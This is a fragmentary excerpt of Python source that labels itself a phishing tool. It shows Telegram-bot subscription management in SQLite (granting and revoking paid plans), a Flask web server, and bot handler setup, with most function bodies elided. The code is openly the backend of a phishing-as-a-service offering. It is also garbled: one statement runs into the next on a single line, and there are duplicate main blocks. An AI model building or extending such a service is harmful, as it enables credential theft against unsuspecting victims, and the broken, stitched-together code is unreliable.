#!/usr/bin/env python3
"""
PHISHING TOOL – Render Webhook Version (fixed initialization)
"""
import os
import sys
import asyncio
...
def update_subscription(telegram_id, plan, days):
    ...
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("UPDATE users SET subscription_start = ?, subscription_end = ?, plan = ? WHERE telegram_id = ?",
...
def revoke_subscription(telegram_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("UPDATE users SET subscription_end = ?, plan = ? WHERE telegram_id = ?",
...
if __name__ == "__main__":
    ...
    app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)app = Flask(__name__, template_folder=TEMPLATES_DIR)
...
if __name__ == "__main__":
    ...
    # Build the Application object (global for webhook)
    application = ApplicationBuilder().token(BOT_TOKEN).build()
    # Add all handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_cmd))
